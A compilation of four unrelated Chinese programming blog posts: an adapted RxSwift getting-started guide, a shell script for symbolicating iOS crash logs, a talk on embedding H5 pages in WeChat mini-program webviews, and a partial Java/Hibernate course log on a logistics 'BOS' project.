还有一些额外的保证，所有的序列产生者（sequence producers、Observable s），必须遵守.
它们在哪一个线程上产生元素无关紧要，但如果它们生成一个元素并发送给观察者observer.on(.next(nextElement))，那么在 observer.on 方法执行完成前，它们不能发送下一个元素。
如果 .next 事件还没有完成，那么生产者也不能发送终止 .completed 或 .error 。
简而言之，考虑以下示例：
someObservable
  .subscribe { (e: Event<Element>) in
      print("Event processing started")
      // processing
      print("Event processing ended")
  }
它始终打印：
Event processing started
Event processing ended
Event processing started
Event processing ended
Event processing started
Event processing ended
它永远无法打印：
Event processing started
Event processing started
Event processing ended
Event processing ended
Creating your own Observable (aka observable sequence)
关于观察者有一个重要的事情需要理解。
创建 observable 时，它不会仅仅因为它已创建而执行任何工作。
确实，Observable 可以通过多种方式产生元素。其中一些会导致副作用，一些会影响现有的运行过程，例如点击鼠标事件等。
但是，如果只调用一个返回 Observable 的方法，那么没有序列生成，也没有副作用。Observable仅仅定义序列的生成方法以及用于元素生成的参数。序列生成始于 subscribe 方法被调用。
例如，假设你有一个类似原型的方法：
func searchWikipedia(searchTerm: String) -> Observable<Results> {}
let searchForMe = searchWikipedia("me")

// no requests are performed, no work is being done, no URL requests were fired

let cancel = searchForMe
  // sequence generation starts now, URL requests are fired
  .subscribe(onNext: { results in
      print(results)
  })
有许多方法可以生成你自己的 Observable 序列，最简单方法或许是使用 create 函数。
RxSwift 提供了一个方法可以创建一个序列，这个序列订阅时返回一个元素。这个方法是 just。我们亲自实现一下：
func myJust<E>(_ element: E) -> Observable<E> {
    return Observable.create { observer in
        observer.on(.next(element))
        observer.on(.completed)
        return Disposables.create()
    }
}

myJust(0)
    .subscribe(onNext: { n in
      print(n)
    })
这会打印：
0
不错，create 函数是什么？
它只是一个便利方法，使你可以使用 Swift 的闭包轻松实现 subscribe 方法。像 subscribe 方法一样，它带有一个参数 observer，并返回 disposable。
以这种方式实现的序列实际上是同步的（synchronous）。它将生成元素，并在 subscribe 调用返回 disposable 表示订阅前终止。因此，它返回的 disposable 并不重要，生成元素的过程不会被中断。
当生成同步序列，通常用于返回的 disposable 是 NopDisposable 的单例。
现在，我们来创建一个从数组中返回元素的 observable。
func myFrom<E>(_ sequence: [E]) -> Observable<E> {
    return Observable.create { observer in
        for element in sequence {
            observer.on(.next(element))
        }

        observer.on(.completed)
        return Disposables.create()
    }
}

let stringCounter = myFrom(["first", "second"])

print("Started ----")

// first time
stringCounter
    .subscribe(onNext: { n in
        print(n)
    })

print("----")

// again
stringCounter
    .subscribe(onNext: { n in
        print(n)
    })

print("Ended ----")
上边的例子会打印：
Started ----
first
second
----
first
second
Ended ----
Creating an Observable that perfroms work
OK，现在更有趣了。我们来创建前边示例中使用的 interval 操作符。
这相当于 dispatch queue schedulers 的实际实现
func myInterval(_ interval: TimeInterval) -> Observable<Int> {
    return Observable.create { observer in
        print("Subscribed")
        let timer = DispatchSource.makeTimerSource(queue: DispatchQueue.global())
        timer.scheduleRepeating(deadline: DispatchTime.now() + interval, interval: interval)

        let cancel = Disposables.create {
            print("Disposed")
            timer.cancel()
        }

        var next = 0
        timer.setEventHandler {
            if cancel.isDisposed {
                return
            }
            observer.on(.next(next))
            next += 1
        }
        timer.resume()

        return cancel
    }
}
let counter = myInterval(0.1)

print("Started ----")

let subscription = counter
    .subscribe(onNext: { n in
        print(n)
    })


Thread.sleep(forTimeInterval: 0.5)

subscription.dispose()

print("Ended ----")
上边的示例会打印：
Started ----
Subscribed
0
1
2
3
4
Disposed
Ended ----
如果这样写：
let counter = myInterval(0.1)

print("Started ----")

let subscription1 = counter
    .subscribe(onNext: { n in
        print("First \(n)")
    })
let subscription2 = counter
    .subscribe(onNext: { n in
        print("Second \(n)")
    })

Thread.sleep(forTimeInterval: 0.5)

subscription1.dispose()

Thread.sleep(forTimeInterval: 0.5)

subscription2.dispose()

print("Ended ----")
那么打印如下：
Started ----
Subscribed
Subscribed
First 0
Second 0
First 1
Second 1
First 2
Second 2
First 3
Second 3
First 4
Second 4
Disposed
Second 5
Second 6
Second 7
Second 8
Second 9
Disposed
Ended ----
订阅后的每个订阅者（subscriber）同行会生成自己独立的元素序列。默认情况下，操作符是无状态的。无状态的操作符远多于有状态的操作符。
Sharing subscription and share operator
但是，如果你希望多个观察者从一个订阅共享事件（元素），该怎么办？
有两件事需要定义:

如何处理在新订阅者有兴趣观察它们之前收到的过去的元素(replay lastest only, replay all, replay last n)
如何决定何时出发共享的订阅（refCount， manual or some other algorithm)

通常是一个这样的组合，replay(1).refCount，也就是 share(replay: 1)。
let counter = myInterval(0.1)
    .share(replay: 1)

print("Started ----")

let subscription1 = counter
    .subscribe(onNext: { n in
        print("First \(n)")
    })
let subscription2 = counter
    .subscribe(onNext: { n in
        print("Second \(n)")
    })

Thread.sleep(forTimeInterval: 0.5)

subscription1.dispose()

Thread.sleep(forTimeInterval: 0.5)

subscription2.dispose()

print("Ended ----")
这将打印：
Started ----
Subscribed
First 0
Second 0
First 1
Second 1
First 2
Second 2
First 3
Second 3
First 4
Second 4
First 5
Second 5
Second 6
Second 7
Second 8
Second 9
Disposed
Ended ----
请注意现在只有一个 Subscribed 和 Disposed 事件。
对 URL 可观察对象（observable）的行为是等效的。
下面的例子展示了如何的 HTTP 请求封装在 Rx 中，这种封装非常像 interval 操作符的模式。
extension Reactive where Base: URLSession {
    public func response(_ request: URLRequest) -> Observable<(Data, HTTPURLResponse)> {
        return Observable.create { observer in
            let task = self.dataTaskWithRequest(request) { (data, response, error) in
                guard let response = response, let data = data else {
                    observer.on(.error(error ?? RxCocoaURLError.Unknown))
                    return
                }

                guard let httpResponse = response as? HTTPURLResponse else {
                    observer.on(.error(RxCocoaURLError.nonHTTPResponse(response: response)))
                    return
                }

                observer.on(.next(data, httpResponse))
                observer.on(.completed)
            }

            task.resume()

            return Disposables.create {
                task.cancel()
            }
        }
    }
}
Operator
RxSwift 实现了许多操作符。
所有操作符的的 marble diagram 可以在 ReactiveX.io 看到。
在 Playgrouds 里边几乎有所有操作符的演示。
如果你需要一个操作符，并且不知道如何找到它，这里有一个操作符的决策树。
Custom operators
有两种方式可以创建自定义的操作符。
Easy way
所有的内部代码都使用高度优化的运算符版本，因此它们不是最好的教程材料。这就是为什么我们非常鼓励使用标准运算符。
幸运的是，有一种简单的方法来创建操作符。创建新的操作符实际上就是创建可观察对象，前边的章节已经描述了如何做到这一点。
来看一下为优化的 map 操作符的实现：
extension ObservableType {
    func myMap<R>(transform: @escaping (E) -> R) -> Observable<R> {
        return Observable.create { observer in
            let subscription = self.subscribe { e in
                    switch e {
                    case .next(let value):
                        let result = transform(value)
                        observer.on(.next(result))
                    case .error(let error):
                        observer.on(.error(error))
                    case .completed:
                        observer.on(.completed)
                    }
                }

            return subscription
        }
    }
}

现在可以使用自定义的 map 了：
let subscription = myInterval(0.1)
    .myMap { e in
        return "This is simply \(e)"
    }
    .subscribe(onNext: { n in
        print(n)
    })

这将打印：
Subscribed
This is simply 0
This is simply 1
This is simply 2
This is simply 3
This is simply 4
This is simply 5
This is simply 6
This is simply 7
This is simply 8
...
Life happens
那么，如果用自定义运算符解决某些情况太难了呢？ 你可以退出 Rx monad，在命令性世界中执行操作，然后使用 Subjects 再次将结果隧道传输到Rx。
下边的例子是不应该被经常实践的，是糟糕的代码味道，但是你可以这么做。
let magicBeings: Observable<MagicBeing> = summonFromMiddleEarth()

magicBeings
  .subscribe(onNext: { being in     // exit the Rx monad
      self.doSomeStateMagic(being)
  })
  .disposed(by: disposeBag)

//
//  Mess
//
let kitten = globalParty(   // calculate something in messy world
  being,
  UIApplication.delegate.dataSomething.attendees
)
kittens.on(.next(kitten))   // send result back to rx

//
// Another mess
//
let kittens = BehaviorRelay(value: firstKitten) // again back in Rxmonad
kittens.asObservable()
  .map { kitten in
    return kitten.purr()
  }
  // ....
每一次你这样写的时候，其他人可能在其他地方写这样的代码：
kittens
  .subscribe(onNext: { kitten in
    // do something with kitten
  })
  .disposed(by: disposeBag)
所以，不要尝试这么做。
Error handling
有两种错误机制。
Asynchrouous error handling mechanism in observables
错误处理非常直接，如果一个序列以错误而终止，则所有依赖的序列都将以错误而终止。这是通常的短路逻辑。
你可以使用 catch 操作符从可观察对象的失败中恢复，有各种各样的可以让你详细指定恢复。
还有 retry 操作符，可以在序列出错的情况下重试。
KVO
KVO 是一个 Objective-C 的机制。这意味着他没有考虑类型安全，该项目试图解决这个问题的一部分。
有两种内置的方式支持 KVO：
// KVO
extension Reactive where Base: NSObject {
    public func observe<E>(type: E.Type, _ keyPath: String, options: KeyValueObservingOptions, retainSelf: Bool = true) -> Observable<E?> {}
}

#if !DISABLE_SWIZZLING
// KVO
extension Reactive where Base: NSObject {
    public func observeWeakly<E>(type: E.Type, _ keyPath: String, options: KeyValueObservingOptions) -> Observable<E?> {}
}
#endif
看一下观察 UIView 的 frame 的例子，注意 UIKit 并不遵从 KVO，但是这样可以
view
  .rx.observe(CGRect.self, "frame")
  .subscribe(onNext: { frame in
    ...
  })
或
view
  .rx.observeWeakly(CGRect.self, "frame")
  .subscribe(onNext: { frame in
    ...
  })
rx.observe
rx.observe 有更好的性能，因为它只是对 KVO 机制的包装，但是它使用场景有限。

它可用于观察从所有权图表中的self或祖先开始的 path（retainSelf = false）
它可用于观察从所有权图中的后代开始的 path（retainSelf = true）
path 必须只包含 strong 属性，否则你可能会因为在 dealloc 之前没有取消注册KVO观察者而导致系统崩溃。

例如：
self.rx.observe(CGRect.self, "view.frame", retainSelf: false)
rx.observeWeakly
rx.observeWeakly 比 rx.observe 慢一些，因为它必须在若引用的情况下处理对象释放。
它不仅适用于 rx.observe 适用的所有场景，还适用于：

因为它不会持有被观察的对象，所以它可以用来观察所有权关系位置的任意对象
它可以用来观察 weak 属性

Observing structs
KVO 是 Objective-C 的机制，所以它重度以来 NSValue 。
RxCocoa 内置支持 KVO 观察 CGRect、CGSize、CGPoint 结构体。
当观察其他结构体时，需要手动从 NSValue 中提前值。
这里有展示如何通过实现 KVORepresentable 协议，为其他的结构体扩展 KVO 观察和 *rx.observe**方法。
UI layer tips
在绑定到 UIKit 控件时，Observable 需要在 UI 层中满足某些要求。
Threading
Observable 需要在 MainScheduler 发送值，这只是普通的 UIKit/Cocoa 要求。
你的 API 最好在 MainScheduler 上返回结果。如果你试图从后台线程绑定一些东西到 UI，在 Debug build 中，RxCocoa 通常会抛出异常来通知你。
可以通过添加 observeOn(MainScheduler.instance) 来修复该问题。
Error
你无法将失败绑定到 UIKit 控件，因为这是为定义的行为。
如果你不知道 Observable 是否可以失败，你可以通过使用 catchErrorJustReturn(valueThatIsReturnedWhenErrorHappens) 来确保它不会失败，但是错误发生后，基础序列仍将完成。
如果所需行为是基础序列继续产生元素，则需要某些版本的 retry 操作符。
Sharing subscription
你通常希望在 UI 层中共享订阅，你不希望单独的 HTTP 调用将相同的数据绑定到多个 UI 元素。
假设你有这样的代码：
let searchResults = searchText
    .throttle(0.3, $.mainScheduler)
    .distinctUntilChanged
    .flatMapLatest { query in
        API.getSearchResults(query)
            .retry(3)
            .startWith([]) // clears results on new search term
            .catchErrorJustReturn([])
    }
    .share(replay: 1)    // <- notice the `share` operator
你通常想要的是在计算后共享搜索结果，这就是 share 的含义。
在 UI 层中，在转换链的末尾添加 share 通常是一个很好的经验法则。因为你想要共享计算结果，而不是把 searcResults 绑定到多个 UI 元素时，触发多个 HTTP 连接。
另外，请参阅 Driver，它旨在透明地包装这些 share 调用，确保在主 UI 县城上观察元素，并且不会将错误绑定到 UI。

原文为RxSwift/Getting Started，本文在原文基础上依自身需要略有修改。

********************************************************************************************************************************************************************************************************
脚本处理iOS的Crash日志
背景
当我们打包app时，可以选择生成对应的符号表，其保存 16 进制函数地址映射信息，通过给定的函数起始地址和偏移量，可以对应函数具体信息以供分析。
所以我们拿到测试给的闪退日志(.crash)时，需要找到打包时对应生成的符号表(.dSYM)作为钥匙解析。具体分为下面几个步骤

dwarfdump --uuid 命令获取 .dSYM 的 uuid
打开 .crash 文件，在特定位置找到 uuid
根据 arm 版本比对两者是否一致
到 Xcode 目录下寻找 symbolicatecrash 工具

不同版本文件路径不同，具体版本请谷歌。Xcode9路径是/Applications/Xcode.app/Contents/SharedFrameworks/DVTFoundation.framework/Versions/A/Resources/

设置终端环境变量
export DEVELOPER_DIR="/Applications/Xcode.app/Contents/Developer"
使用 symbolicatecrash 工具解析日志
symbolicatecrash .crash .dsym > a.out

虽然过程不复杂，但是每次都需要手动执行一次检查与命令，过于繁琐，所以决定用脚本化提高效率。
___
步骤实现
输入Crash日志
#要求输入crash文件路径
inputFile 'Please Input Crash File' 'crash'
crashPath=$filePath
由于需要输入两种不同后缀的文件路径，且都需要检查，因此统一定义一个方法。
#定义全局变量
filePath=
#输入文件路径
inputFile() {
    readSuccess=false
    #首先清空变量值
    filePath=
    while [ $readSuccess = false ]; do 
        echo $1
        #读取到变量中
        read -a filePath
        if [[ ! -e $filePath || ${filePath##*.} != $2 ]]; then
            echo "Input file is not ."$2
        else
            readSuccess=true
        fi
    done
}
.dSYM 是文件夹路径，所以这里简单的判断了路径是否存在，如果不存在就继续让用户输入。

Shell命令中判断分为[]与[[]]，后者比前者更通用，可以使用 || 正则运算等。
判断中，-f表示检查是否存在该文件，-d表示检查是否存在文件夹，-e表示检查是否存在该路径

输入dSYM符号表
dsymSuccess=false
while [ $dsymSuccess = false ]; do
    #要求输入dSYM文件路径
    inputFile 'Please Input dSYM File' 'dSYM'
    dsymPath=$filePath
    #检查是否匹配
    checkUUID "$crashPath" "$dsymPath"
    match=$?
    if [ $match -eq 0 ]; then
        echo 'UUID not match!'
    else
        dsymSuccess=true
    fi
done
循环获取匹配 UUID 的 dSYM ，这里使用了另一种方法获取方法返回值，具体之后章节会总结。
查找symbolicatecrash工具
在 Xcode 文件夹指定路径下查找工具，加快效率，如果没找到就停止运行。
# 查找symbolicatecrash解析工具，内置在Xcode的库文件中
toolPath=`find /Applications/Xcode.app/Contents/SharedFrameworks -name symbolicatecrash | head -n 1`
if [ ! -f $toolPath ]; then
    echo "Symbolicatecrash not exist!"
    exit 0
fi
执行解析命令
#先设置环境变量
export DEVELOPER_DIR="/Applications/Xcode.app/Contents/Developer"
#指定解析结果路径
crashName=`basename $crashPath`
afterPath="$(dirname "$crashPath")"/"${crashName%%.*}""_after.crash"
#开始解析
$toolPath "$crashPath" "$dsymPath" > "$afterPath" 2> /dev/null 
这里我将错误信息导流到 /dev/null，保证解析文件没有杂乱信息。

遇到的问题
怎么获取函数返回值？
之前没有处理过需要返回数值的方法，所以一开始有点懵，查询资料后最终采用了两种方式实现了效果，现在做一些总结。
全局变量记录
#定义全局变量
filePath=
inputFile() {
    #读取到变量中
    read -a filePath
}
inputFile
crashPath=$filePath
通过 inputFile 方法来了解一下，首先定义一个全局变量为 filePath，在方法中重新赋值，方法结束后读取全局变量中的数据。
这种方法的好处是可以自定义返回参数类型和个数，缺点是容易和其他变量搞混。
Return返回值
类似与C语言中的用法，脚本也支持 retrun 0 返回结果并停止运行。
checkUUID() {
    grep "$arm64id" "$1"
    if [ $? -ne 0 ]; then
        return 1;
    fi
    return 0;
}
checkUUID "$crashPath" "$dsymPath"
match=$?
获取结果的方式为 $?，其能够返回环境中最后一个指令结果，也就是之前执行的checkUUID的结果。
优点是简洁明了，符合编码习惯，缺点是返回值只能是 0-255 的数字，不能返回其他类型的数据。
获取打印值
还有一种方法其实平时一直在使用，只不过并不了解其运行方式。
crashName=`basename $crashPath`

print() {
    echo "Hello World"
}
text=$(print)
运行系统预设的方法或者自定义方法，将执行命令用 $() 的方式使用，就可以获取该命令中所有打印的信息，赋值到变量就可以拿到需要的返回值。
优点是功能全效率高，使用字符串的方式可以传递定制化信息，缺点是不可预期返回结果，需要通过字符串查找等命令辅助。
循环输入合法路径
在我的设想中，需要用户输入匹配的 dSYM 文件路径，如果不匹配，则重新输入，直到合法。为了支持嵌套，需要定义局部变量控制循环，具体代码如下
dsymSuccess=false
while [ $dsymSuccess = false ]; do
    #要求输入dSYM文件路径
    inputFile 'Please Input dSYM File' 'dSYM'
    dsymPath=$filePath
    #检查是否匹配
    checkUUID "$crashPath" "$dsymPath"
    match=$?
    if [ $match -eq 0 ]; then
        echo 'UUID not match!'
    else
        dsymSuccess=true
    fi
done
### 处理字符串
获取到 UUID 所有输出信息后，需要截取出对应平台的信息，处理还是不太熟悉，特地整理如下
#原始信息
UUID: 92E495AA-C2D4-3E9F-A759-A50AAEF446CD (armv7) /Volumes/.dSYM/Contents/Resources/DWARF/app
UUID: 536527A8-0243-34DB-AE08-F1F64ACA4351 (arm64) /Volumes/.dSYM/Contents/Resources/DWARF/app

#去除中间间隔-
uuid=${uuid//-/}

#从后往前找第一个匹配 \(arm64的，并且都删除
arm64id=${uuid% \(arm64*}
#处理后
UUID: 92E495AAC2D43E9FA759A50AAEF446CD (armv7) /Volumes/.dSYM/Contents/Resources/DWARF/app
UUID: 536527A8024334DBAE08F1F64ACA4351

#从前往后找最后一个UUID: ，并删除
arm64id=${arm64id##*UUID: }
#处理后 
536527A8024334DBAE08F1F64ACA4351

总结
看似简单的脚本，也花了一天时间编写，总体还是不太熟练，仍需努力联系。
这次特地尝试了与上次不同的参数输入方法，使用提示输入的方式，果然遇到了新的问题。好在都查资料解决了，结果还算满意。
脚本我提交到了Github，欢迎大家指教共同进步！给个关注最好啦～

********************************************************************************************************************************************************************************************************
小程序webview实践
小程序webview实践 -- 张所勇

大家好，我是转转开放业务部前端负责人张所勇，今天主要来跟大家分享小程序webview方面的问题，但我并不会讲小程序的webview原理，而我主要想讲的是小程序内如何嵌入H5。
那么好多同学会想了，不就是用web-view组件就可以嵌入了吗，是的，如果咱们的小程序和H5的业务比较简单，那直接用webview接入就好了，但我们公司的h5除小程序之外，还运行在转转app、58app、赶集app等多个端，如何能实现一套代码在多端运行，这是我今天主要想分享的，因此今天分享更适合h5页面比较复杂，存在多端运行情况的开发者，期待能给大家提供一些多端兼容的思路。

下面我先跟大家介绍下今天演讲主要的提纲。

小程序技术演进
webview VS 小程序
h5多端兼容方案
小程序sdk设计
webview常见问题

1 转转小程序演进过程

相信在座的很多同学的产品跟转转小程序经历了类似的发展过程，我们转转小程序是从去年五月份开始开发的，那时候也是小程序刚出来不久，我们就快速用原生语法搭建了个demo，功能很简单，就是首页列表页详情页。
然后我们从7月份开始进入了第二个阶段，这时候各种中大型公司已经意识到了，借助微信的庞大用户群，小程序是一个很好的获客渠道，因此我们也从demo阶段正式的开始了小程序开发。

那时候我们整个团队从北京跑到广州的微信园区里面去封闭开发，我们一方面在做小程序版本的转转，实现了交易核心流程，苦苦的做了两三个月，DAU始终也涨不上去，另一方面我们也在做很多营销活动的尝试，我们做了一款简单的测试类的小游戏，居然几天就刷屏了，上百万的pv，一方面我们很欣喜，另一方面也很尴尬，因为大家都是来玩的，不是来交易的，所以我们就开始了第三阶段。
这个阶段我们进行了大量的开发工作，让我们的小程序功能和体验接近了转转APP，那到了今年6月份，我们的小程序进入了微信钱包里面，我们的DAU峰值也达到了千万级别，这时候可以说已经成为了一个风口上的新平台，这个时候问题来了，公司的各条线业务都开始想接入到小程序里面。

于是乎就有了上面这段对话。
所以，为了能够更好接入各业务线存量h5页面和新的活动页，我们开始着手进行多端适配的工作。
那我们会考虑三种开发方案（我这里只说缺点）

在webview这个组件出来以前，我们是采用第一种方案，用纯小程序开发所有业务页面，那么适合的框架有现在主流的三种，wepy，mpvue、taro，缺点是不够灵活，开发成本巨大，真的很累，尤其是业务方来找我们想介入小程序，但他们的开发者又不会小程序，当时又不能嵌入H5，所以业务方都希望我们来开发，所有业务都来找，你们可以想想成本又多高，这个方案肯定是不可行，第二种方案，就是一套代码编译出多套页面，在不同端运行，mpvue和taro都可以，我们公司有业务团队在使用mpvue，编译出来的结果不是特别理性，一是性能上面没有达到理想的状态，二是api在多端兼容上面二次改造的成本很高，各个端api差异很大，如果是一个简单的活动页还好，但如果是一个跟端有很大功能交互的页面，那这种方式其实很难实现。
那我们采用的是第三种方案，目前我们的小程序是作为一个端存在，像app一样，我们只做首页、列表、详情、购买等等核心页面都是用小程序开发，每个业务的页面、活动运营页面都是H5，并且用webview嵌入，这样各个业务接入的成本非常低，但这也有缺点，1是小程序与h5交互和通信比较麻烦，二是我们的app提供了很大功能支持，这些功能在小程序里面都需要对应的实现
2 webview VS 小程序

这张图是我个人的理解。（并不代表微信官方的看法）
把webview和小程序在多个方面做了比对。
3 h5多端兼容方案

未来除了小程序之外，可能会多的端存在，比如智能小程序等等，那我们期望的结果是什么呢，就是一套H5能运行于各个环境内。

这可能是最差的一个case，h5判断所在的环境，去调用不同api方法，这个case的问题是，业务逻辑特别复杂，功能耦合非常严重，也基本上没有什么复用性。

那我们转转采取的是什么方案呢？
分三块，小程序端，用WePY框架，H5这块主要是vue和react，中间通过一个adapter来连接。我们转转的端特别多，除了小程序还包括纯转转app端，58端，赶集端，纯微信端，qq端，浏览器端，所以H5页面需要的各种功能，在每个端都需要对应的功能实现，比如登录、发布、支付、个人中心等等很多功能，这些功能都需要通过adapter这个中间件进行调用，接下来详细来讲。

我这里就不贴代码了，我只讲下adapter的原理，首先adapter需要初始化，做两件事情，一是产出一个供h5调用的native对象，二是需要检测当前所处的环境，然后根据环境去异步加载sdk文件，这里的关键点是我们要做个api调用的队列，因为sdk加载时异步的过程，如果期间页面内发生了api调用，那肯定得不到正确的响应，因此你要做个调用队列，当sdk初始化完毕之后再处理这些调用，其实adapter原理很简单，如果你想实现多端适配，那么只需要根据所在的环境去加载不同的sdk就可以了。

做好adapter之后，你需要让每个h5的项目都引入adapter文件，并且在调用api的时候，都统一在native对象下面调用。
4 小程序sdk设计

我们总结小程序提供给H5的功能大体分为这四种，第一是基于小程序的五种跳转能力，比如关闭当前页面。

那我们看到小程序提供了这五种跳转方式。

第二是直接使用微信sdk提供的能力，比如扫码，这个比较简单。第三是h5打开小程序的某些页面，这个是最常用的，比如进入下单页等。

对应每个api，小程序这边都需要实现对应的页面功能，大家看这几个图，skipToChat就是进到我们的IM页面，下面依次是进入个人主页，订单详情页，下单页面，其实我们的小程序开发的主要工作也是去做这些基础功能页面，然后提供给H5，各个业务基本都是H5实现，接入到小程序里面来，我们只做一个平台。

这是进入个人主页方法的实现，其实就是进入了小程序profile这个页面。

第四就是h5与小程序直接的通信能力，这个比较集中体现在设置分享信息和登录这块。
4.1 设置分享

上面（adapter）做好了以后，在h5这块调用就一句话就可以了。

小程序和h5 之间的通信基本上常用两种方式，一个是postMessage，这个方法大家都知道，只有在三种情况才可以触发，后退、销毁和分享，但也有个问题，这个方法是基础库1.7.1才开始支持的，1.7.1以下就只能通过第二种方法来传递数据，也就是设置和检测webview组件的url变化，类似pc时代的iframe的通信方式。

sdk这块怎么做呢，定义一个share方法，首先需要检测下基础库版本，看是否支持postMessage，如果支持直接调用，如果不支持，把分享参数拼接到url当中，然后进行一次重载，所以说通过url传递数据有个缺点，就是页面可能需要刷新一次才能设置成功。

我们看下分享信息设置这块，小程序这端，首先通过bindmessage事件接收h5传回来的数据，然后在用户分享的时候onShareAppMessage判断有没有回传的数据，如果没有就到webviewurl当中取，否则就是用默认分享数据。

h5调分享这块，我们也做了一些优化，传统方式是要四步才能掉起分享面板，点页面里的某个按钮，然后给用户个提示层，用户再去点右上角的点点点，再点转发，才能拉起分享面板。

我们后来改成了这样，点分享按钮，把分享信息带到一个专门的小程序页面，这个页面里面放一个button，type=share，点一下就拉起来面板了，虽然是一个小小的改动，但能大幅提高分享成功率的，因为很多用户对右上角的点点点不太敏感。
4.2 登录
接下来我们看看登录功能

分两种情况，接入的H5可能一开始就需要登录态，也可能开始不需要登录态中途需要登录，这两种情况我们约定了h5通过自己的url上一个参数进行控制。

一开始就需要登录态的情况，那么在加载webview之前，首先进行授权登录，然后把登录信息拼接到url里面，再去来加载webview，在h5里面通过adapter来把登录信息提取出来并且存到cookie里，这样h5一进来就是有登陆态的。
一开始不需要登录态的情况，一进入小程序就直接通过webview加载h5，h5调用login方法的时候，把needLogin这个参数拼接到url中，然后利用api进行重载，就走了第一种情况进行授权登录了。

5 webview常见问题
5.1 区分环境
第一是你如何区分h5所在的环境是小程序里面的webview还是纯微信浏览器，为什么要区分呢，因为你的H5在不同环境需要不同的api，比如我们的业务，下单的时候，如果是小程序，那么我们需要进入小程序的下单页，如果是纯微信，我们之间进纯微信的下单页，这两种情况的api实现是不一样的，那么为什么难区分，大家可能知道，小程序的组件分为内置组件和原生组件，内置组件就是小程序定义的view、scroll-view这些基本的标签，原生组件就是像map啊这种，这其实是调用了微信的原生能力，webview也是一种类似原生的组件，为什么说是类似原生的组件，微信并没有为小程序专门做一套webview机制，而是直接用微信本身的浏览器，所以小程序webview和微信浏览器的内核都是一样的，包括UA头都是一模一样，cookie、storage本地存储数据都是互通的，都是一套，因此我们很难区分具体是在哪个环境。

还好微信提供了一个环境变量，但这个变量不是很准确，加载h5以后第一个页面可以及时拿到，但后续的页面都需要在微信的sdk加载完成以后才能拿到，因此建议大家在wx.ready或者是weixinjsbridgeready事件里面去判断，区别就在于前者需要加载jweixin.js才有，但这里有坑，坑在于h5的开发者可能并不知道你这个检测过程需要时间，是一个异步的过程，他们可能页面一加载就需要调用一些api，这时候就可能会出错，因此你一定要提供一个api调用的队列和等待机制。
5.2 支付
第二个常见问题是支付，因为小程序webview里面不支持直接掉起微信支付，所以基本上需要支付的时候，都需要来到小程序里面，支付完再回去。

上面做好了以后，在h5这块调用就一句话就可以了。

我们转转的业务分两种支付情况，一是有的业务h5有自己完善的交易体系，下单动作在h5里面就可以完成，他们只需要小程序付款，因此我们有一个精简的支付页，进来直接就拉起微信支付，还有一种情况是业务需要小程序提供完整的下单支付流程，那么久可以之间进入我们小程序的收银台来，图上就是sdk里面的基本逻辑，我们通过payOnly这个参数来决定进到哪个页面。

我们再看下小程序里面精简支付怎么实现的，就是onload之后之间调用api拉起微信支付，支付成功以后根据h5传回来的参数，如果是个小程序页面，那之间跳转过去，否则就刷新上一个webview页面，然后返回回去。
5.3 formId收集
第三个问题是formId，webview里面没有办法收集formId，这有什么影响呢，没有formId就没法发服务通知，没有服务通知，业务就没办法对新用户进行召回，这对业务来讲是一个很大的损失，目前其实我们也没有很好的方案收集。

我们目前主要通过两种方式收集，访问量比较大的这种webview落地页，我们会做一版小程序的页面或者做一个小程序的中转页，只要用户有任何触摸页面的操作，都可以收集到formid，另外一种就是h5进入小程序页面时候收集，比如支付，IM这些页面，但并不是每个用户都会进到这些页面的，用户可能一进来看不感兴趣，就直接退出了，因此这种方式存在很大的流失。
5.4 左上角返回
那怎么解决这种流失呢，我们加了一个左上角返回的功能，。

首先进入的是一个空白的中转页，然后进入h5页面，这样左上角就会出现返回按钮了，当用户按左上角的返回按钮时候，页面会被重载到小程序首页去，这个看似简单又微小的动作，对业务其实有很大的影响，我们看两个数字，经过我们的数据统计发现，左上角返回按钮点击率高达70%以上，因为这种落地页一般是被用户分享出来的，以前纯h5的时候只能通过左上角返回，所以在小程序里用户也习惯如此，第二个数字，重载到首页以后，后续页面访问率有10%以上，这两个数字对业务提升其实蛮大的。

其实现原理很简单，都是通过第二次触发onShow时进行处理。
以上就是我今天全部演讲的内容，谢谢大家！

这是我们“大转转FE”的公众号。里面发表了很多FE和小程序方向的原创文章。感兴趣的同学可以关注一下，如果有问题可以在文章底部留言，我们共同探讨。
同时也感谢掘金举办了这次大会，让我有机会同各位同仁进行交流。在未来的前端道路上，与大家共勉！

********************************************************************************************************************************************************************************************************
day53_BOS项目_05


今天内容安排：

1、添加定区
2、定区分页查询
3、hessian入门 --> 远程调用技术
4、基于hessian实现定区关联客户



1、添加定区
定区可以将取派员、分区、客户信息关联到一起。页面：WEB-INF/pages/base/decidedzone.jsp




第一步：使用下拉框展示取派员数据，需要修改combobox的URL地址，发送请求
    <tr>        <td>选择取派员</td>        <td>            <input class="easyui-combobox" name="staff.id"                  data-options="valueField:'id',textField:'name',                    url:'${pageContext.request.contextPath}/staffAction_listajax.action'" />          </td>    </tr>
浏览器效果截图：
第二步：在StaffAction中提供listajax()方法，查询没有作废的取派员，并返回json数据
    /**     * 查询没有作废的取派员，并返回json数据     * @return     * @throws IOException      */    public String listajax() throws IOException {        List<Staff> list = staffService.findListNoDelete();        String[] excludes = new String[] {"decidedzones"}; // 我们只需要Staff的id和name即可，其余的都不需要，本例中我们只排除关联的分区对象        this.writeList2Json(list, excludes);        return "none";    }
第三步：在StaffService中提供方法查询没有作废的取派员
    /**     * 查询没有作废的取派员，即查询条件：deltag值为“0”     */    public List<Staff> findListNoDelete() {        // 创建离线条件查询对象        DetachedCriteria detachedCriteria = DetachedCriteria.forClass(Staff.class);        // 向离线条件查询对象中封装条件        detachedCriteria.add(Restrictions.eq("deltag", "0"));        return staffDao.findByCriteria(detachedCriteria);    }
第四步：在IBaseDao中提供通用的条件查询方法IBaseDao.java
    // 条件查询（不带分页）    public List<T> findByCriteria(DetachedCriteria detachedCriteria);
BaseDaoImpl.java
    /**     * 通用条件查询（不带分页）     */    public List<T> findByCriteria(DetachedCriteria detachedCriteria) {        return this.getHibernateTemplate().findByCriteria(detachedCriteria);    }
浏览器效果截图：
第五步：使用数据表格datagrid展示未关联到定区的分区数据decidedzone.jsp
    <td valign="top">关联分区</td>    <td>        <table id="subareaGrid"  class="easyui-datagrid" border="false" style="width:300px;height:300px"                 data-options="url:'${pageContext.request.contextPath}/subareaAction_listajax.action',                fitColumns:true,singleSelect:false">            <thead>                  <tr>                      <th data-options="field:'id',width:30,checkbox:true">编号</th>                      <th data-options="field:'addresskey',width:150">关键字</th>                      <th data-options="field:'position',width:200,align:'right'">位置</th>                  </tr>              </thead>         </table>    </td>
浏览器效果截图：
